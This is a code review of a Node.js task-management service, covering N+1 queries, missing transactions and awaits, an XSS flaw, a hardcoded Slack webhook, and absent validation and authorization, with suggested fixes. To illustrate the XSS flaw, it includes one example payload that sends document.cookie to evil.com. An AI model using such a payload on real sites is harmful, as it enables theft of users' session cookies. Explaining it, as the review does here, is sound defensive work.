# Code Review: task-service.js

## File: task-service.js (new, 68 lines)

A Node.js task management service providing CRUD operations against a SQL database with Slack webhook integration.

---

## Architecture

### N+1 Query Problem in `getTasksWithAssignees` (lines 10-22) -- CRITICAL

The function fetches all tasks, then issues three separate queries per task (assignee, comments, labels) inside a loop. For a project with 100 tasks, this executes 301 queries instead of 4.

**Recommended fix:** Use JOINs or batch queries.

```js
// Option A: Single query with JOINs
const tasks = await db.query(`
  SELECT t.*, u.id as user_id, u.name, u.email
  FROM tasks t
  LEFT JOIN users u ON t.assignee_id = u.id
  WHERE t.project_id = $1
`, [projectId]);

// Then batch-fetch comments and labels using WHERE task_id = ANY($1)
const taskIds = tasks.map(t => t.id);
const comments = await db.query(
  "SELECT * FROM comments WHERE task_id = ANY($1) ORDER BY created_at DESC",
  [taskIds]
);
```

### Missing Transaction in `deleteCompletedTasks` (lines 49-58) -- CRITICAL

Deleting across four tables (comments, task_labels, task_history, tasks) without a transaction means a failure mid-way leaves the database in an inconsistent state. If the delete on `task_history` fails, comments and labels are already gone but the task still exists.

**Recommended fix:** Wrap in a transaction.

```js
const client = await db.getClient();
try {
  await client.query("BEGIN");
  // ... all deletes ...
  await client.query("COMMIT");
} catch (err) {
  await client.query("ROLLBACK");
  throw err;
} finally {
  client.release();
}
```

### Race Condition and Missing Transaction in `updateTaskStatus` (lines 33-46) -- CRITICAL

Three independent problems:

1. **No `await` on any of the three async calls** (lines 34, 36, 41). The `db.query` and `fetch` calls return promises that are silently discarded. Errors will become unhandled promise rejections, and the caller has no idea whether the operation succeeded.

2. **No transaction.** The history insert reads the old status via a subquery (`SELECT status FROM tasks WHERE id = $1`), but the UPDATE on line 34 may have already changed it -- or may not have completed yet since it is not awaited. The recorded "old_status" is unreliable.

3. **The history INSERT references `$1` for both `task_id` and the subquery's `WHERE id`**, which is correct by coincidence (both are `taskId`), but the overall sequencing is broken due to the missing awaits.

**Recommended fix:** Await all calls, wrap in a transaction, capture old status before the update.

---

## Security

### XSS Vulnerability in `buildTaskReport` (lines 61-67) -- HIGH

Task titles and assignee names are interpolated directly into HTML with no escaping:

```js
html += `<tr><td>${task.title}</td><td>${task.assignee}</td><td>${task.status}</td></tr>`;
```

A task titled `<script>document.location='https://evil.com/steal?c='+document.cookie</script>` would execute in any browser rendering this report.

**Recommended fix:** Escape HTML entities before interpolation, or use a templating engine with auto-escaping.

```js
function escapeHtml(str) {
  return String(str)
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;");
}
```

### Hardcoded Slack Webhook URL (line 37) -- HIGH

The Slack webhook URL `https://hooks.slack.com/services/T00/B00/xxx` is hardcoded in source. Webhook URLs are secrets -- anyone with the URL can post to the channel.

**Recommended fix:** Move to an environment variable (`process.env.SLACK_WEBHOOK_URL`) and ensure it is not committed to version control.

### No Input Validation on `newStatus` (line 33) -- MEDIUM

`updateTaskStatus` accepts any string for `newStatus` and writes it directly to the database. While parameterized queries prevent SQL injection, there is no business-logic validation. Any arbitrary string (empty, extremely long, or nonsensical) is accepted.

**Recommended fix:** Validate against an allowlist of valid statuses.

```js
const VALID_STATUSES = new Set(["todo", "in_progress", "review", "done"]);
if (!VALID_STATUSES.has(newStatus)) {
  throw new Error(`Invalid status: ${newStatus}`);
}
```

### No Authorization Checks -- MEDIUM

None of the exported functions verify that the caller is authorized to access or modify the given project or task. Any caller can delete all completed tasks for any project, update any task's status, or read any project's data.

---

## Performance

### Sequential Deletes in `deleteCompletedTasks` (lines 52-57) -- MEDIUM

Each completed task triggers four sequential DELETE queries in a loop. For 50 completed tasks, that is 200 sequential queries.

**Recommended fix:** Use batch deletes.

```js
const taskIds = completed.map(t => t.id);
await db.query("DELETE FROM comments WHERE task_id = ANY($1)", [taskIds]);
await db.query("DELETE FROM task_labels WHERE task_id = ANY($1)", [taskIds]);
await db.query("DELETE FROM task_history WHERE task_id = ANY($1)", [taskIds]);
await db.query("DELETE FROM tasks WHERE id = ANY($1)", [taskIds]);
```

Alternatively, use `ON DELETE CASCADE` foreign keys and delete only from the `tasks` table.

### `SELECT *` Usage (lines 4, 15, 21) -- LOW

`SELECT *` fetches all columns, including potentially large text fields or blobs. The tasks query (line 4) and comments query (line 15) both use `SELECT *`. Only fetch the columns you need.

---

## Code Quality

### Fire-and-Forget `fetch` Call (line 36-39) -- HIGH

The Slack notification `fetch` is not awaited and has no error handling. If the webhook fails (network error, rate limit, invalid URL), the error is silently swallowed. Worse, since this appears to be a Node.js service, unhandled promise rejections may crash the process depending on the Node version.

**Recommended fix:** At minimum, `await` the call and wrap in try/catch. Better: extract notification to a separate function with retry logic, or use a message queue for reliability.

### No Error Handling Anywhere -- HIGH

None of the four functions have try/catch blocks or any error handling. A database failure will throw an unhandled exception up to the caller with no context about what operation failed.

### No JSDoc or Type Information -- LOW

The functions have no documentation of their parameters or return types. At minimum, add JSDoc annotations for the public API:

```js
/**
 * @param {string} projectId
 * @returns {Promise<Array<{id: string, title: string, assignee: object, comments: Array, labels: Array}>>}
 */
```

### Missing `package.json` and Module Configuration

The file uses ESM `import` syntax but there is no `package.json` with `"type": "module"`. This will fail at runtime in Node.js unless the file is renamed to `.mjs`.

---

## Summary of Issues by Severity

| Severity | Count | Issues |
|----------|-------|--------|
| Critical | 3 | N+1 queries, missing transactions (x2), missing awaits |
| High     | 3 | XSS vulnerability, hardcoded secret, no error handling |
| Medium   | 3 | No input validation, no authorization, sequential batch deletes |
| Low      | 2 | SELECT *, no JSDoc |

The most urgent items to address before merging:

1. Add `await` to all async calls in `updateTaskStatus` -- the function is fundamentally broken without them.
2. Wrap multi-table mutations in transactions (`updateTaskStatus`, `deleteCompletedTasks`).
3. Escape HTML output in `buildTaskReport` to prevent XSS.
4. Move the Slack webhook URL to an environment variable.
5. Replace the N+1 loop in `getTasksWithAssignees` with batch queries.
